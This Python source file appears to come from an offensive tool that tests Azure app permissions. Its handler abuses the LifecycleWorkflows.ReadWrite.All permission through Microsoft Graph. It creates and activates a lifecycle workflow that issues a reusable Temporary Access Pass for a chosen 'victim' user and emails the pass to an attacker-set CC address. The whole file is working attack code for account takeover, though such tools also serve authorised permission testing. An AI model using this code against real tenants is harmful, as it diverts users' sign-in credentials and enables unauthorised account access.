from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests
import random, string
import json as js

logger = logger.createLogger('attacks.handlers.lifecycle_pass_handler')


class Lifecycle_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "LifecycleWorkflows.ReadWrite.All" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to lifecycle_pass vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "LifecycleWorkflowsPasswordVectors"
            message = ""
            error = "LifecycleWorkflowsPasswordVectors - failed"
            conf = request.attack_config['lifecycle']
            logger.debug("LifecycleWorkflows.ReadWrite.All - Allows the app to create, update, list, read and delete all workflows, tasks and related lifecycle workflows resources without a signed-in user.")
            logger.debug("Attack vector - get new passwords for users.")
            try:
                letters = string.ascii_lowercase
                displayname =  ''.join(random.choice(letters) for i in range(15))

                create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows"
                message_obj = {"category":"joiner","displayName":"PermissionPanic " + displayname,"description":"Configure Post-Onboarding PermissionPanic","tasks":[{"arguments":[{"name":"tapLifetimeMinutes","value":"60"},{"name":"tapIsUsableOnce","value":"false"},{"name":"cc","value":conf["userCC"]}],"description":"Generate Temporary Access Pass and send via email to user's manager and more user","displayName":"Generate TAP and Send Email"+displayname,"isEnabled":"true","continueOnError":"false","taskDefinitionId":"1b555e50-7f65-41d5-b514-5894a026d10d","category":"joiner"}],"executionConditions":{"@odata.type":"#microsoft.graph.identityGovernance.triggerAndScopeBasedConditions","scope":{"@odata.type":"microsoft.graph.identityGovernance.ruleBasedSubjectSet","rule":"(department eq 'Marketing')"},"trigger":{"@odata.type":"#microsoft.graph.identityGovernance.timeBasedAttributeTrigger","offsetInDays":7,"timeBasedAttribute":"createdDateTime"}},"isEnabled":"true","isSchedulingEnabled":"false"}

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                json = result.json()
                
                print(js.dumps(json))
                
                if result.status_code == 201:
                    id = json["id"]
                    create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows/" + id + "/activate"
                    message_obj = {"subjects":[{"id":conf["victim"]}]}
                    result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                    
                    if result.status_code == 204:

                        message += "set up a tap! on %s sent to %s  \n" % (conf["victim"], conf["userCC"])
                        status = True
                        
                if message == "":
                    message = error
            except Exception as e:
                logger.error(f"Unexpected exception in lifecycle_pass_handler function: {e}")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
